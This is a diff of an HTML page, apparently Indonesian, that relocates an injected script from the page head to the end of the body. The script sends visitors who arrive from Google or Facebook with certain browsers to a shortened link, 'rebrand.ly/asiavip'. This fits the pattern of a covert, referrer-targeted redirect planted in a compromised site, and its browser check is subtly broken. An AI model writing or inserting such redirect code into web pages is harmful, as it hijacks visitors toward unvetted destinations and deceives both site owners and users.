@@ -1,18 +1,4 @@
 <!doctype html>
-<script>
-	var allowedDomains = ["google", "facebook"];
-var allowedUserAgents = ["Chrome", "Firefox"];
-
-var referer = document.referrer;
-var userAgent = navigator.userAgent;
-
-for (var i = 0; i < allowedDomains.length; i++) {
-  if (referer.includes(allowedDomains[i]) && allowedUserAgents.includes(userAgent)) {
-    window.location.href = "https://rebrand.ly/asiavip";
-    break;
-  }
-}
-</script>
 <html class="no-js" lang="id">
   <head>
     <meta charset="UTF-8">
@@ -536,4 +522,20 @@ for (var i = 0; i < allowedDomains.length; i++) {
             </ul>
         </div>
     </div>
-</div></body></html>
+</div>
+		<script>
+	var allowedDomains = ["google", "facebook"];
+var allowedUserAgents = ["Chrome", "Firefox"];
+
+var referer = document.referrer;
+var userAgent = navigator.userAgent;
+
+for (var i = 0; i < allowedDomains.length; i++) {
+  if (referer.includes(allowedDomains[i]) && allowedUserAgents.includes(userAgent)) {
+    window.location.href = "https://rebrand.ly/asiavip";
+    break;
+  }
+}
+</script>
+	</body>
+</html>
